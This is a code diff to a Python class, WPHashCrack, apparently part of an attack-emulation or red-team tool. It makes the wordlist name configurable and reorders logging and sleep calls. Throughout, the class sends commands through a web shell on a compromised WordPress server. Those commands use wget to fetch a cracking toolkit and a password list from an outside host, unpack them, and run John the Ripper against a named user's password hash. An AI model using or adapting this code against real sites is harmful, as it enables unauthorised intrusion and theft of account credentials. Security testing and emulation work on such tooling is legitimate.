@@ -519,6 +519,7 @@ class WPHashCrack:
         hashcrack_url: str,
         file_name: str,
         wl_host: str,
+        wl_name: str,
         attacked_user: str,
         tar_download_name: str = None,
         cmd_param: str = "wp_meta",
@@ -531,6 +532,7 @@ class WPHashCrack:
             hashcrack_url: url of the hashcrack tar.
             file_name: name of the hashcrack tar.
             wl_host: address of the host where wordlist is available.
+            wl_name: name of the wordlist.
             attacked_user: the name of the WP user to crack the password.
             tar_download_name: the name of the hashcrack tar after downloading.
             cmd_param: the GET parameter to embed the command in.
@@ -541,6 +543,7 @@ class WPHashCrack:
         self.url = hashcrack_url
         self.file_name = file_name
         self.wl_host = wl_host
+        self.wl_name = wl_name
         self.attacked_user = attacked_user
         self.tar_download_name = tar_download_name
         self.cmd_param = cmd_param
@@ -563,10 +566,10 @@ class WPHashCrack:
             web_shell=web_shell,
         )
         if web_shell is not None:
-            log.info("Downloading WPHashCrack")
-            archive_download_cmd = ["wget", self.url + self.file_name]
+            archive_download_cmd = ["wget", str(self.url)]
             if self.tar_download_name is not None:
                 archive_download_cmd += ["-O", self.tar_download_name]
+            log.info("Downloading WPHashCrack")
             output = send_request(
                 log,
                 web_shell,
@@ -575,12 +578,12 @@ class WPHashCrack:
                 self.verify,
                 self.timeout,
             )
-            sleep(self.sleep_time)
-            log.info("Web shell command response", output=output)
             log.info("Downloaded WPHashCrack")
-            log.info("Unarchiving WPHashCrack")
+            log.info("Web shell command response", output=output)
+            sleep(self.sleep_time)
             if self.tar_download_name is None:
                 self.tar_download_name = self.file_name
+            log.info("Unarchiving WPHashCrack")
             output = send_request(
                 log,
                 web_shell,
@@ -589,21 +592,21 @@ class WPHashCrack:
                 self.verify,
                 self.timeout,
             )
-            sleep(self.sleep_time)
-            log.info("Web shell command response", output=output)
             log.info("Unarchived WPHashCrack")
+            log.info("Web shell command response", output=output)
+            sleep(self.sleep_time)
             log.info("Downloading password list")
             output = send_request(
                 log,
                 web_shell,
-                ["wget", self.wl_host],
+                ["wget", str(self.wl_host)],
                 self.cmd_param,
                 self.verify,
                 self.timeout,
             )
-            sleep(self.sleep_time)
-            log.info("Web shell command response", output=output)
             log.info("Downloaded password list")
+            log.info("Web shell command response", output=output)
+            sleep(self.sleep_time)
             log.info("Running WPHashCrack")
             output = send_request(
                 log,
@@ -611,7 +614,7 @@ class WPHashCrack:
                 [
                     "./wphashcrack-0.1/wphashcrack.sh",
                     "-w",
-                    "$PWD/rockyou.txt",
+                    "$PWD/" + self.wl_name,
                     "-j",
                     "./wphashcrack-0.1/john-1.7.6-jumbo-12-Linux64/run",
                     "-u",
@@ -621,9 +624,8 @@ class WPHashCrack:
                 self.verify,
                 self.timeout,
             )
-            sleep(self.sleep_time)
-            log.info("Web shell command response", output=output)
             log.info("Finished WPHashCrack")
+            log.info("Web shell command response", output=output)
         else:
             log.error("Missing web shell url")
             raise Exception("No web shell to execute at")
